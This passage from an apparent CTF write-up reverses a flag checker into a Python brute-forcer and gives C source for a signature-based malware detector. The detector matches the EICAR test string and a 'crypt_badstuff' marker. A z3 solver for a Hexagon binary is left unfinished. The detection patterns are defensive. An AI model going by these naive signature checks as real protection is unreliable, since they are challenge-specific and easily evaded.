                <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;BUG&quot;</span>)
                <span class="hljs-attribute">break</span>

<span class="hljs-attribute">else</span>:
    <span class="hljs-comment">#56</span>
    <span class="hljs-attribute">if</span> Q != <span class="hljs-number">0</span>:
        <span class="hljs-comment">#57</span>
        <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;INVALID_FLAG&quot;</span>)
    <span class="hljs-attribute">else</span>:
        <span class="hljs-comment">#58</span>
        <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;CORRECT&quot;</span>)

</code></pre><p>Which can be simplified as:</p>
<pre class="hljs"><code><span class="hljs-string">ROM</span> <span class="hljs-string">=</span> {<span class="hljs-attr">0:</span> <span class="hljs-number">187</span>,<span class="hljs-attr">1:</span> <span class="hljs-number">85</span>,<span class="hljs-attr">2:</span> <span class="hljs-number">171</span>,<span class="hljs-attr">3:</span> <span class="hljs-number">197</span>,<span class="hljs-attr">4:</span> <span class="hljs-number">185</span>,<span class="hljs-attr">5:</span> <span class="hljs-number">157</span>,<span class="hljs-attr">6:</span> <span class="hljs-number">201</span>,<span class="hljs-attr">7:</span> <span class="hljs-number">105</span>,<span class="hljs-attr">8:</span> <span class="hljs-number">187</span>,<span class="hljs-attr">9:</span> <span class="hljs-number">55</span>,<span class="hljs-attr">10:</span> <span class="hljs-number">217</span>,<span class="hljs-attr">11:</span> <span class="hljs-number">205</span>,<span class="hljs-attr">12:</span> <span class="hljs-number">33</span>,<span class="hljs-attr">13:</span> <span class="hljs-number">179</span>,<span class="hljs-attr">14:</span> <span class="hljs-number">207</span>,<span class="hljs-attr">15:</span> <span class="hljs-number">207</span>,<span class="hljs-attr">16:</span> <span class="hljs-number">159</span>,<span class="hljs-attr">17:</span> <span class="hljs-number">9</span>,<span class="hljs-attr">18:</span> <span class="hljs-number">181</span>,<span class="hljs-attr">19:</span> <span class="hljs-number">61</span>,<span class="hljs-attr">20:</span> <span class="hljs-number">235</span>,<span class="hljs-attr">21:</span> <span class="hljs-number">127</span>,<span class="hljs-attr">22:</span> <span class="hljs-number">87</span>,<span class="hljs-attr">23:</span> <span class="hljs-number">161</span>,<span class="hljs-attr">24:</span> <span class="hljs-number">235</span>,<span class="hljs-attr">25:</span> <span class="hljs-number">135</span>,<span class="hljs-attr">26:</span> <span class="hljs-number">103</span>,<span class="hljs-attr">27:</span> <span class="hljs-number">35</span>,<span class="hljs-attr">28:</span> <span class="hljs-number">23</span>,<span class="hljs-attr">29:</span> <span class="hljs-number">37</span>,<span class="hljs-attr">30:</span> <span class="hljs-number">209</span>,<span class="hljs-attr">31:</span> <span class="hljs-number">27</span>,<span class="hljs-attr">32:</span> <span class="hljs-number">8</span>,<span class="hljs-attr">33:</span> <span class="hljs-number">100</span>,<span class="hljs-attr">34:</span> <span class="hljs-number">100</span>,<span class="hljs-attr">35:</span> <span class="hljs-number">53</span>,<span class="hljs-attr">36:</span> <span class="hljs-number">145</span>,<span class="hljs-attr">37:</span> <span class="hljs-number">100</span>,<span class="hljs-attr">38:</span> <span class="hljs-number">231</span>,<span class="hljs-attr">39:</span> <span class="hljs-number">160</span>,<span class="hljs-attr">40:</span> <span class="hljs-number">6</span>,<span class="hljs-attr">41:</span> <span class="hljs-number">170</span>,<span class="hljs-attr">42:</span> <span class="hljs-number">221</span>,<span class="hljs-attr">43:</span> <span class="hljs-number">117</span>,<span class="hljs-attr">44:</span> <span class="hljs-number">23</span>,<span class="hljs-attr">45:</span> <span class="hljs-number">157</span>,<span class="hljs-attr">46:</span> <span class="hljs-number">109</span>,<span class="hljs-attr">47:</span> <span class="hljs-number">92</span>,<span class="hljs-attr">48:</span> <span class="hljs-number">94</span>,<span class="hljs-attr">49:</span> <span class="hljs-number">25</span>,<span class="hljs-attr">50:</span> <span class="hljs-number">253</span>,<span class="hljs-attr">51:</span> <span class="hljs-number">233</span>,<span class="hljs-attr">52:</span> <span class="hljs-number">12</span>,<span class="hljs-attr">53:</span> <span class="hljs-number">249</span>,<span class="hljs-attr">54:</span> <span class="hljs-number">180</span>,<span class="hljs-attr">55:</span> <span class="hljs-number">131</span>,<span class="hljs-attr">56:</span> <span class="hljs-number">134</span>,<span class="hljs-attr">57:</span> <span class="hljs-number">34</span>,<span class="hljs-attr">58:</span> <span class="hljs-number">66</span>,<span class="hljs-attr">59:</span> <span class="hljs-number">30</span>,<span class="hljs-attr">60:</span> <span class="hljs-number">87</span>,<span class="hljs-attr">61:</span> <span class="hljs-number">161</span>,<span class="hljs-attr">62:</span> <span class="hljs-number">40</span>,<span class="hljs-attr">63:</span> <span class="hljs-number">98</span>,<span class="hljs-attr">64:</span> <span class="hljs-number">250</span>,<span class="hljs-attr">65:</span> <span class="hljs-number">123</span>,<span class="hljs-attr">66:</span> <span class="hljs-number">27</span>,<span class="hljs-attr">67:</span> <span class="hljs-number">186</span>,<span class="hljs-attr">68:</span> <span class="hljs-number">30</span>,<span class="hljs-attr">69:</span> <span class="hljs-number">180</span>,<span class="hljs-attr">70:</span> <span class="hljs-number">179</span>,<span class="hljs-attr">71:</span> <span class="hljs-number">88</span>,<span class="hljs-attr">72:</span> <span class="hljs-number">198</span>,<span class="hljs-attr">73:</span> <span class="hljs-number">243</span>,<span class="hljs-attr">74:</span> <span class="hljs-number">140</span>,<span class="hljs-attr">75:</span> <span class="hljs-number">144</span>,<span class="hljs-attr">76:</span> <span class="hljs-number">59</span>,<span class="hljs-attr">77:</span> <span class="hljs-number">186</span>,<span class="hljs-attr">78:</span> <span class="hljs-number">25</span>,<span class="hljs-attr">79:</span> <span class="hljs-number">110</span>,<span class="hljs-attr">80:</span> <span class="hljs-number">206</span>,<span class="hljs-attr">81:</span> <span class="hljs-number">223</span>,<span class="hljs-attr">82:</span> <span class="hljs-number">241</span>,<span class="hljs-attr">83:</span> <span class="hljs-number">37</span>,<span class="hljs-attr">84:</span> <span class="hljs-number">141</span>,<span class="hljs-attr">85:</span> <span class="hljs-number">64</span>,<span class="hljs-attr">86:</span> <span class="hljs-number">128</span>,<span class="hljs-attr">87:</span> <span class="hljs-number">112</span>,<span class="hljs-attr">88:</span> <span class="hljs-number">224</span>,<span class="hljs-attr">89:</span> <span class="hljs-number">77</span>,<span class="hljs-attr">90:</span> <span class="hljs-number">28</span>}

<span class="hljs-comment"># all int are int8</span>

<span class="hljs-string">from</span> <span class="hljs-string">ctypes</span> <span class="hljs-string">import</span> <span class="hljs-string">*</span>
<span class="hljs-string">from</span> <span class="hljs-string">string</span> <span class="hljs-string">import</span> <span class="hljs-string">printable</span>
<span class="hljs-string">idx</span> <span class="hljs-string">=</span> <span class="hljs-number">4</span>

<span class="hljs-string">flag</span> <span class="hljs-string">=</span> <span class="hljs-string">list(b&#x27;CTF{write_flag_here_please}&#x27;)</span>

<span class="hljs-string">I</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">M</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">N</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span>
<span class="hljs-string">P</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">Q</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">for</span> <span class="hljs-string">i</span> <span class="hljs-string">in</span> <span class="hljs-string">range(27):</span>
    <span class="hljs-string">ROM[128+i]</span> <span class="hljs-string">=</span> <span class="hljs-string">flag[i]</span>

<span class="hljs-string">while</span> <span class="hljs-string">I</span> <span class="hljs-type">!=</span> <span class="hljs-attr">27:</span>
    <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">c_uint8(ROM[128+I]*ROM[I]).value</span>
    <span class="hljs-string">(M,</span> <span class="hljs-string">N)</span> <span class="hljs-string">=</span> <span class="hljs-string">(N,</span> <span class="hljs-string">M</span> <span class="hljs-string">+</span> <span class="hljs-string">N)</span>
    <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">c_uint8(A+M).value</span>
    <span class="hljs-string">C</span> <span class="hljs-string">=</span> <span class="hljs-string">ROM[32+I]</span>
    <span class="hljs-string">A</span> <span class="hljs-string">^=</span> <span class="hljs-string">C</span>
    <span class="hljs-string">P</span> <span class="hljs-string">=</span> <span class="hljs-string">c_uint8(P+A).value</span>
    <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">ROM[64+I]</span>
    <span class="hljs-string">A</span> <span class="hljs-string">^=</span> <span class="hljs-string">P</span>
    <span class="hljs-string">Q</span> <span class="hljs-string">|=</span> <span class="hljs-string">A</span>
    <span class="hljs-string">I</span> <span class="hljs-string">+=</span> <span class="hljs-number">1</span>

<span class="hljs-string">if</span> <span class="hljs-string">Q</span> <span class="hljs-type">!=</span> <span class="hljs-attr">0:</span>
    <span class="hljs-string">print(&quot;INVALID_FLAG&quot;)</span>
<span class="hljs-attr">else:</span>
    <span class="hljs-string">print(&quot;CORRECT&quot;)</span>
</code></pre><p>It&#39;s possible to reverse the operations to get the flag, but brute forcing is more easy and quickly.</p>
<pre class="hljs"><code>ROM = {<span class="hljs-number">0</span>: <span class="hljs-number">187</span>,<span class="hljs-number">1</span>: <span class="hljs-number">85</span>,<span class="hljs-number">2</span>: <span class="hljs-number">171</span>,<span class="hljs-number">3</span>: <span class="hljs-number">197</span>,<span class="hljs-number">4</span>: <span class="hljs-number">185</span>,<span class="hljs-number">5</span>: <span class="hljs-number">157</span>,<span class="hljs-number">6</span>: <span class="hljs-number">201</span>,<span class="hljs-number">7</span>: <span class="hljs-number">105</span>,<span class="hljs-number">8</span>: <span class="hljs-number">187</span>,<span class="hljs-number">9</span>: <span class="hljs-number">55</span>,<span class="hljs-number">10</span>: <span class="hljs-number">217</span>,<span class="hljs-number">11</span>: <span class="hljs-number">205</span>,<span class="hljs-number">12</span>: <span class="hljs-number">33</span>,<span class="hljs-number">13</span>: <span class="hljs-number">179</span>,<span class="hljs-number">14</span>: <span class="hljs-number">207</span>,<span class="hljs-number">15</span>: <span class="hljs-number">207</span>,<span class="hljs-number">16</span>: <span class="hljs-number">159</span>,<span class="hljs-number">17</span>: <span class="hljs-number">9</span>,<span class="hljs-number">18</span>: <span class="hljs-number">181</span>,<span class="hljs-number">19</span>: <span class="hljs-number">61</span>,<span class="hljs-number">20</span>: <span class="hljs-number">235</span>,<span class="hljs-number">21</span>: <span class="hljs-number">127</span>,<span class="hljs-number">22</span>: <span class="hljs-number">87</span>,<span class="hljs-number">23</span>: <span class="hljs-number">161</span>,<span class="hljs-number">24</span>: <span class="hljs-number">235</span>,<span class="hljs-number">25</span>: <span class="hljs-number">135</span>,<span class="hljs-number">26</span>: <span class="hljs-number">103</span>,<span class="hljs-number">27</span>: <span class="hljs-number">35</span>,<span class="hljs-number">28</span>: <span class="hljs-number">23</span>,<span class="hljs-number">29</span>: <span class="hljs-number">37</span>,<span class="hljs-number">30</span>: <span class="hljs-number">209</span>,<span class="hljs-number">31</span>: <span class="hljs-number">27</span>,<span class="hljs-number">32</span>: <span class="hljs-number">8</span>,<span class="hljs-number">33</span>: <span class="hljs-number">100</span>,<span class="hljs-number">34</span>: <span class="hljs-number">100</span>,<span class="hljs-number">35</span>: <span class="hljs-number">53</span>,<span class="hljs-number">36</span>: <span class="hljs-number">145</span>,<span class="hljs-number">37</span>: <span class="hljs-number">100</span>,<span class="hljs-number">38</span>: <span class="hljs-number">231</span>,<span class="hljs-number">39</span>: <span class="hljs-number">160</span>,<span class="hljs-number">40</span>: <span class="hljs-number">6</span>,<span class="hljs-number">41</span>: <span class="hljs-number">170</span>,<span class="hljs-number">42</span>: <span class="hljs-number">221</span>,<span class="hljs-number">43</span>: <span class="hljs-number">117</span>,<span class="hljs-number">44</span>: <span class="hljs-number">23</span>,<span class="hljs-number">45</span>: <span class="hljs-number">157</span>,<span class="hljs-number">46</span>: <span class="hljs-number">109</span>,<span class="hljs-number">47</span>: <span class="hljs-number">92</span>,<span class="hljs-number">48</span>: <span class="hljs-number">94</span>,<span class="hljs-number">49</span>: <span class="hljs-number">25</span>,<span class="hljs-number">50</span>: <span class="hljs-number">253</span>,<span class="hljs-number">51</span>: <span class="hljs-number">233</span>,<span class="hljs-number">52</span>: <span class="hljs-number">12</span>,<span class="hljs-number">53</span>: <span class="hljs-number">249</span>,<span class="hljs-number">54</span>: <span class="hljs-number">180</span>,<span class="hljs-number">55</span>: <span class="hljs-number">131</span>,<span class="hljs-number">56</span>: <span class="hljs-number">134</span>,<span class="hljs-number">57</span>: <span class="hljs-number">34</span>,<span class="hljs-number">58</span>: <span class="hljs-number">66</span>,<span class="hljs-number">59</span>: <span class="hljs-number">30</span>,<span class="hljs-number">60</span>: <span class="hljs-number">87</span>,<span class="hljs-number">61</span>: <span class="hljs-number">161</span>,<span class="hljs-number">62</span>: <span class="hljs-number">40</span>,<span class="hljs-number">63</span>: <span class="hljs-number">98</span>,<span class="hljs-number">64</span>: <span class="hljs-number">250</span>,<span class="hljs-number">65</span>: <span class="hljs-number">123</span>,<span class="hljs-number">66</span>: <span class="hljs-number">27</span>,<span class="hljs-number">67</span>: <span class="hljs-number">186</span>,<span class="hljs-number">68</span>: <span class="hljs-number">30</span>,<span class="hljs-number">69</span>: <span class="hljs-number">180</span>,<span class="hljs-number">70</span>: <span class="hljs-number">179</span>,<span class="hljs-number">71</span>: <span class="hljs-number">88</span>,<span class="hljs-number">72</span>: <span class="hljs-number">198</span>,<span class="hljs-number">73</span>: <span class="hljs-number">243</span>,<span class="hljs-number">74</span>: <span class="hljs-number">140</span>,<span class="hljs-number">75</span>: <span class="hljs-number">144</span>,<span class="hljs-number">76</span>: <span class="hljs-number">59</span>,<span class="hljs-number">77</span>: <span class="hljs-number">186</span>,<span class="hljs-number">78</span>: <span class="hljs-number">25</span>,<span class="hljs-number">79</span>: <span class="hljs-number">110</span>,<span class="hljs-number">80</span>: <span class="hljs-number">206</span>,<span class="hljs-number">81</span>: <span class="hljs-number">223</span>,<span class="hljs-number">82</span>: <span class="hljs-number">241</span>,<span class="hljs-number">83</span>: <span class="hljs-number">37</span>,<span class="hljs-number">84</span>: <span class="hljs-number">141</span>,<span class="hljs-number">85</span>: <span class="hljs-number">64</span>,<span class="hljs-number">86</span>: <span class="hljs-number">128</span>,<span class="hljs-number">87</span>: <span class="hljs-number">112</span>,<span class="hljs-number">88</span>: <span class="hljs-number">224</span>,<span class="hljs-number">89</span>: <span class="hljs-number">77</span>,<span class="hljs-number">90</span>: <span class="hljs-number">28</span>}

<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable
idx = <span class="hljs-number">4</span>

dic = (n <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> printable[:-<span class="hljs-number">5</span>].encode())
flag = <span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;CTF{write_flag_here_please}&#x27;</span>)
flag_len = <span class="hljs-built_in">len</span>(flag)

<span class="hljs-keyword">while</span> idx &lt; flag_len:
    I = <span class="hljs-number">0</span>
    M = <span class="hljs-number">0</span>
    N = <span class="hljs-number">1</span>
    P = <span class="hljs-number">0</span>
    Q = <span class="hljs-number">0</span>
    flag[idx] = <span class="hljs-built_in">next</span>(dic)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):
        ROM[<span class="hljs-number">128</span>+i] = flag[i]

    <span class="hljs-keyword">while</span> I &lt;= idx:
        A = c_uint8(ROM[<span class="hljs-number">128</span>+I]*ROM[I]).value
        (M, N) = (N, M + N)
        A = c_uint8(A+M).value
        C = ROM[<span class="hljs-number">32</span>+I]
        A ^= C
        P = c_uint8(P+A).value
        A = ROM[<span class="hljs-number">64</span>+I]
        A ^= P
        Q |= A
        <span class="hljs-keyword">if</span> Q != <span class="hljs-number">0</span>:
            <span class="hljs-keyword">break</span>
        I += <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))
        dic = (n <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> printable[:-<span class="hljs-number">5</span>].encode())
        idx += <span class="hljs-number">1</span>

<span class="hljs-comment">#56</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))
<span class="hljs-keyword">if</span> Q != <span class="hljs-number">0</span>:
    <span class="hljs-comment">#57</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;INVALID_FLAG&quot;</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-comment">#58</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CORRECT&quot;</span>)

</code></pre><h3 id="polymorph"><a class="header-link" href="#polymorph"></a>Polymorph</h3>
<p>We use the following strategy to detect the malware:</p>
<ul class="list">
<li>match the executable file with signature <code>&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</code></li>
<li>Has RWX segment</li>
<li>Has string <code>crypt_badstuff</code></li>
</ul>
<p>Because there is a normal program <code>ASPARAGUS</code> has RWX segment, we use the special string,<code>You look around. Everything is black. Except for some text,</code>, in it as a special case.</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE <span class="hljs-comment">/* See feature_test_macros(7) */</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;syscall.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;elf.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printerror</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>{
  <span class="hljs-built_in">puts</span>(msg);
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    <span class="hljs-comment">//assume all files that let antivirus crash is malicious</span>
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">openFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *fname)</span></span>{
  <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(fname,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
  <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>) <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;open failed&quot;</span>);
  <span class="hljs-keyword">return</span> fd;
}

<span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">getFileContent</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd,<span class="hljs-keyword">int</span> *fsize)</span></span>{
  <span class="hljs-keyword">int</span> size = <span class="hljs-built_in">lseek</span>(fd,<span class="hljs-number">0</span>,SEEK_END);
  <span class="hljs-built_in">lseek</span>(fd,<span class="hljs-number">0</span>,SEEK_SET);
  *fsize = size;
  size = (size+<span class="hljs-number">0xfff</span>)&amp;<span class="hljs-number">0xfffff000</span>;
  <span class="hljs-keyword">if</span>(size&lt;<span class="hljs-number">0</span>) <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;file size calculation failed&quot;</span>);
  <span class="hljs-keyword">char</span> *fbuf = <span class="hljs-built_in">mmap</span>(<span class="hljs-number">0</span>,size,<span class="hljs-number">7</span>,<span class="hljs-number">0x2</span>,fd,<span class="hljs-number">0</span>);
  <span class="hljs-keyword">if</span>(fbuf==<span class="hljs-literal">NULL</span>) <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;mmap file failed&quot;</span>);
  <span class="hljs-keyword">return</span> fbuf;
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mal_fingerprint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *content, <span class="hljs-keyword">long</span> bufsize)</span>
</span>{
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memmem</span>(content, bufsize, <span class="hljs-string">&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;</span>, <span class="hljs-number">68</span>))
        <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;malware pattern found&quot;</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memmem</span>(content, bufsize, <span class="hljs-string">&quot;EICAR-STANDARD-ANTIVIRUS-TEST-FILE&quot;</span>, <span class="hljs-number">34</span>))
        <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;tiny malware pattern found&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkNonElfPhdrAndRWX</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *fbuf, <span class="hljs-keyword">int</span> fsize)</span></span>{
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)fbuf;
  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(ehdr-&gt;e_ident,<span class="hljs-string">&quot;\x7f\x45\x4c\x46&quot;</span>,<span class="hljs-number">4</span>))
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    <span class="hljs-comment">//assume all malware should be elf</span>
  <span class="hljs-keyword">if</span>(ehdr-&gt;e_ident[<span class="hljs-number">4</span>]!=<span class="hljs-number">2</span>)
    <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;32 bits&quot;</span>);    <span class="hljs-comment">//32 bit elf binaries are benign, are you kidding me?</span>
  <span class="hljs-keyword">if</span>(ehdr-&gt;e_phoff!=<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(Elf64_Ehdr))
    <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;misaligned phdr&quot;</span>);    <span class="hljs-comment">//I doubt this malware adopts this trick, but just to be safe</span>
  <span class="hljs-keyword">if</span>(ehdr-&gt;e_phnum==<span class="hljs-number">0</span>)
    <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;no phdrs&quot;</span>);    <span class="hljs-comment">//Again, this should be impossible</span>
  Elf64_Phdr *phdr = (Elf64_Phdr*)(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span>)fbuf)+ehdr-&gt;e_phoff);
  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;ehdr-&gt;e_phnum;i++){
     <span class="hljs-keyword">if</span>(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span>)phdr)+<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(Elf64_Phdr)&gt;((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span>)fbuf)+fsize)
       <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;phdr oob&quot;</span>);    <span class="hljs-comment">//Bad binary</span>
     <span class="hljs-keyword">if</span>(i==<span class="hljs-number">0</span> &amp;&amp; phdr-&gt;p_type!=PT_PHDR)
       <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;PT_PHDR missing&quot;</span>);    <span class="hljs-comment">//no PT_PHDR</span>
    <span class="hljs-keyword">if</span>((phdr-&gt;p_flags&amp;(PF_X|PF_W))==(PF_X|PF_W))
       <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;wx page exist&quot;</span>); <span class="hljs-comment">//wx page</span>
     phdr++;
  }
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bypass_ASPARAGUS</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *fbuf, <span class="hljs-keyword">int</span> fsize)</span></span>{
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memmem</span>(fbuf, fsize, <span class="hljs-string">&quot;You look around. Everything is black. Except for some text,&quot;</span>, <span class="hljs-number">59</span>))
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">detect_crypt</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *fbuf, <span class="hljs-keyword">int</span> fsize)</span></span>{
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memmem</span>(fbuf, fsize, <span class="hljs-string">&quot;crypt_badstuff&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;crypt_badstuff&quot;</span>)))
        <span class="hljs-built_in">printerror</span>(<span class="hljs-string">&quot;crypt_badstuff found&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">detect</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *filename)</span>
</span>{
    <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">openFile</span>(filename);
    <span class="hljs-keyword">int</span> fsize;
    <span class="hljs-keyword">char</span> *fbuf = <span class="hljs-built_in">getFileContent</span>(fd,&amp;fsize);
    <span class="hljs-built_in">bypass_ASPARAGUS</span>(fbuf, fsize);
    <span class="hljs-built_in">detect_crypt</span>(fbuf, fsize);
    <span class="hljs-built_in">checkNonElfPhdrAndRWX</span>(fbuf,fsize);
    <span class="hljs-built_in">mal_fingerprint</span>(fbuf, fsize);
    <span class="hljs-keyword">return</span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span>
</span>{
    <span class="hljs-built_in">detect</span>(argv[<span class="hljs-number">1</span>]);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}

</code></pre><h3 id="hexagon"><a class="header-link" href="#hexagon"></a>hexagon</h3>
<ul class="list">
<li>In this challenge, we are given a binary in <a href="https://developer.qualcomm.com/software/hexagon-dsp-sdk">Qualcomm&#39;s Hexagon</a> architecture</li>
<li>I found this <a href="https://github.com/gsmk/hexagon">plugin</a> whuch can help disassembling the binary file</li>
<li>In check_flag(), there are six hex() functions.</li>
<li>They are not difficult to understand. Then, you can use z3 to get the flag.</li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python2</span>

<span class="hljs-attribute">from</span> pwn import *
<span class="hljs-attribute">from</span> z<span class="hljs-number">3</span> import *

<span class="hljs-attribute">f</span> = open(&#x27;challenge&#x27;).read()

<span class="hljs-attribute">target</span> = f[<span class="hljs-number">0</span>x<span class="hljs-number">515</span>:<span class="hljs-number">0</span>x<span class="hljs-number">515</span>+<span class="hljs-number">0</span>x<span class="hljs-number">50</span>]


<span class="hljs-attribute">a</span> = <span class="hljs-number">0</span>x<span class="hljs-number">28</span>

<span class="hljs-attribute">newTarget</span> = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-attribute">for</span> i in target:
  <span class="hljs-comment">#print ord(i)</span>
  <span class="hljs-comment">#print chr((ord(i)^a)%256)</span>
  <span class="hljs-attribute">newTarget</span> += chr((ord(i)^a)%<span class="hljs-number">256</span>)
  <span class="hljs-attribute">a</span>+=<span class="hljs-number">1</span>
<span class="hljs-comment">#print newTarget.encode(&#x27;hex&#x27;)</span>
<span class="hljs-comment">#print newTarget</span>


<span class="hljs-attribute">s</span> = Solver()

<span class="hljs-attribute">x</span> = BitVec(&#x27;a&#x27;,<span class="hljs-number">32</span>)
<span class="hljs-attribute">y</span>= BitVec(&#x27;b&#x27;,<span class="hljs-number">32</span>)

<span class="hljs-attribute">a</span> = x
<span class="hljs-attribute">b</span> = y

<span class="hljs-comment"># hex1</span>

